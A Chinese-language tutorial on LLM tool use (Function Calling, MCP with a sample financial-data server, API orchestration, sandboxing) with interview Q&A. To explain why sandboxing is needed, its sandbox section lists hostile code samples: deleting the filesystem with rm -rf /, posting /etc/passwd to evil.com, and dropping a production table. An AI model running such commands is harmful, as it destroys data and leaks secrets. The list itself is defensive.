LLM 工具调用技术深度解析
总览：工具调用在 Agent 体系中的位置
LLM 本身是一个"纯文本生成器"——它不能上网、不能算数、不能操作数据库。工具调用（Tool-Use）是让 LLM 从"只会说"进化为"能做事" 的关键技术层。

一、Function Calling（函数调用）
1.1 核心原理
Function Calling 是 LLM 供应商（OpenAI/Google/Anthropic）提供的 原生能力：LLM 不直接生成自然语言回答，而是输出一个 结构化的 JSON，声明要调用哪个函数、传什么参数。框架层负责实际执行函数，再把结果喂回给 LLM。

关键洞察：LLM 并不"执行"函数——它只是"决定"调用哪个函数。真正的执行发生在你的代码中。

│                   Schema 设计质量决定调用准确率                │
│                                                             │
│  ❌ 坏的 description:                                       │
│     "获取数据"                                              │
│     → LLM 无法区分该用哪个工具                               │
│                                                             │
│  ✅ 好的 description:                                       │

│                                                             │
│  设计原则:                                                   │
│  1. Name: 动词+名词，如 get_stock_quote, calculate_ratio     │

│  3. Parameters: enum 约束取值范围, description 给出格式示例   │
│  4. Required: 只标记真正必须的参数                            │

1.5 多轮工具调用（Chained Calls）
用户: "茅台的PEG是多少？合理吗？"
Round 1:
  LLM → tool_call: get_stock_quote("600519.SH", fields=["pe_ttm"])
  结果 → {pe_ttm: 31.5}
Round 2:
  LLM: "有了PE，还需要盈利增长率来算PEG"
  LLM → tool_call: get_financial_statement("600519.SH", "income", "2026Q1")
                  + get_financial_statement("600519.SH", "income", "2025Q1")
  结果 → {net_profit_2026Q1: 198亿, net_profit_2025Q1: 180亿}
Round 3:
  LLM: "增长率=(198-180)/180=10%, PEG=31.5/10=3.15"
  LLM: "PEG>2 通常认为估值偏高。茅台当前PEG为3.15,
        意味着市场给予的估值显著超过其盈利增长速度..."
每一轮的 messages 数组:
[
  {role: "user", content: "茅台的PEG是多少？"},
  {role: "assistant", tool_calls: [{...get_stock_quote...}]},
  {role: "tool", tool_call_id: "call_1", content: "{pe_ttm: 31.5}"},
  {role: "assistant", tool_calls: [{...两个get_financial...}]},
  {role: "tool", tool_call_id: "call_2", content: "{...}"},
  {role: "tool", tool_call_id: "call_3", content: "{...}"},
  {role: "assistant", content: "PEG为3.15，估值偏高..."}
]
二、MCP 协议（Model Context Protocol）
2.1 核心原理
MCP 是 Anthropic 于 2024 年底提出的 开放协议标准，目标是解决 Function Calling 的碎片化问题。

Function Calling 的痛点：

没有 MCP 的世界:
  App A          App B          App C
  ┌────┐        ┌────┐        ┌────┐
  │自己写│       │自己写│       │自己写│      每个应用都要
  │Wind │       │Wind │       │Wind │      自己实现一遍
  │接口  │       │接口  │       │接口  │      工具连接逻辑
  │    │        │    │        │    │
  │自己写│       │自己写│       │自己写│
  │DB   │       │DB   │       │DB   │
  │接口  │       │接口  │       │接口  │
  └────┘        └────┘        └────┘
  = N 个应用 × M 个工具 = N×M 个集成
有 MCP 的世界:
  App A    App B    App C          MCP Servers
  ┌────┐  ┌────┐  ┌────┐         ┌──────────┐
  │MCP │  │MCP │  │MCP │         │Wind MCP  │  写一次
  │Client│ │Client│ │Client│◄────►│Server    │  所有应用可用
  └────┘  └────┘  └────┘         ├──────────┤
      │       │       │          │DB MCP    │  写一次
      └───────┴───────┘          │Server    │  所有应用可用
              │                  ├──────────┤
              │ 统一MCP协议       │News MCP  │
              └─────────────────►│Server    │
                                 └──────────┘
  = N 个应用 + M 个工具 = N+M 个集成（USB 式即插即用）

2.5 MCP Server 实现示例（金融场景）
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
const server = new McpServer({
  name: "financial-data",
  version: "1.0.0",
});
server.tool(
  "get_stock_quote",
  "获取A股实时行情数据。返回最新价、涨跌幅、市值、PE、PB等。" +
  "仅用于实时行情查询，历史数据请用 get_historical_prices。",
  {
    symbol: z.string().describe("股票代码，如 600519.SH"),
    fields: z.array(z.enum(["price","change_pct","volume","market_cap","pe_ttm","pb"]))
            .optional()
            .describe("指定返回字段，不传返回全部"),
  },
  async ({ symbol, fields }) => {
    const data = await windApi.getQuote(symbol, fields);
    return {
      content: [{ type: "text", text: JSON.stringify(data) }],
    };
  }
);
server.resource(
  "market-overview",
  "market://overview/a-share",
  "A股市场全景概览，包含大盘指数、涨跌家数、成交额、北向资金等",
  async () => ({
    contents: [{
      uri: "market://overview/a-share",
      mimeType: "application/json",
      text: JSON.stringify(await windApi.getMarketOverview()),
    }],
  })
);
server.prompt(
  "stock-analysis",
  "对指定股票进行全面分析（基本面+技术面+估值）",
  [{ name: "symbol", description: "股票代码", required: true }],
  async ({ symbol }) => ({
    messages: [{
      role: "user",
      content: {
        type: "text",
        text: `请对 ${symbol} 进行全面分析，包括：
1. 基本面：最近4个季度的营收和利润趋势
2. 估值：PE/PB/PEG 与行业对比
3. 技术面：当前均线系统状态
4. 风险提示：至少列出3个风险因素
5. 投资建议：给出目标价区间和操作建议`,
      },
    }],
  })
);
2.6 MCP vs Function Calling 对比
┌──────────────┬────────────────────────┬──────────────────────────┐

三、API 编排（API Orchestration）
3.1 核心原理
真实的金融任务很少只调用一个 API。API 编排 解决的是：多个 API 调用之间的依赖管理、并行化、错误处理、重试、聚合。

这是 Agent 从"能调用工具"到"能高效调用工具"的进阶。

四、沙箱执行（Sandbox Execution）
4.1 核心原理
LLM 可以生成代码，但 直接在宿主机上执行 LLM 生成的代码是极其危险的。沙箱提供一个隔离的执行环境：即使代码是恶意的或有 bug，也不会影响宿主系统。

为什么金融场景特别需要沙箱：

金融场景中 LLM 可能生成的代码:
  ✅ 正常: pd.read_csv("data.csv").groupby("sector").mean()
  ⚠️ 失控: while True: requests.get("http://wind-api/...")   (无限循环打 API)
  ❌ 危险: os.system("rm -rf /")                              (删除系统文件)
  ❌ 泄露: requests.post("http://evil.com", data=open("/etc/passwd"))  (数据外泄)
  ❌ 越权: psycopg2.connect("prod-db").execute("DROP TABLE users")     (操作生产库)

六、面试高频问题
Q1: Function Calling 的 Schema 设计不好会怎样？

直接后果：LLM 调错工具或传错参数。实测显示，好的 description 可以让工具选择准确率从 ~70% 提升到 ~95%。关键技巧：(1) 说明"适合做什么"和"不适合做什么" (2) 参数用 enum 约束取值 (3) 给出格式示例 (4) 相似工具之间要明确区分边界。

Q2: MCP 相比 Function Calling 的最大价值是什么？

可复用性和生态效应。一个团队写好 Wind 数据的 MCP Server，整个公司所有 Agent 应用都能用。而 Function Calling 需要每个应用各自实现。类比：USB 接口标准 vs 每个设备各自定义接口。

Q3: 沙箱中的代码执行失败了怎么办？

分层处理：(1) 语法错误 → 把 stderr 返回给 LLM，让它修正代码重试（通常限制 3 次） (2) 超时 → 告知 LLM 简化计算方案（如减少模拟次数） (3) 依赖缺失 → 告知可用的库列表 (4) 逻辑错误（结果不合理）→ Self-Critique 机制检查输出的数量级是否合理。

Q4: 金融场景中工具调用的安全红线是什么？

(1) 只读与写操作严格分离，写操作必须 Human-in-the-Loop (2) 禁止沙箱访问生产数据库 (3) 所有工具调用全链路审计（who/when/what/result） (4) API Key 不能暴露给 LLM（在框架层注入，LLM 只决定调用什么） (5) 沙箱无网络——需要的数据预先注入。
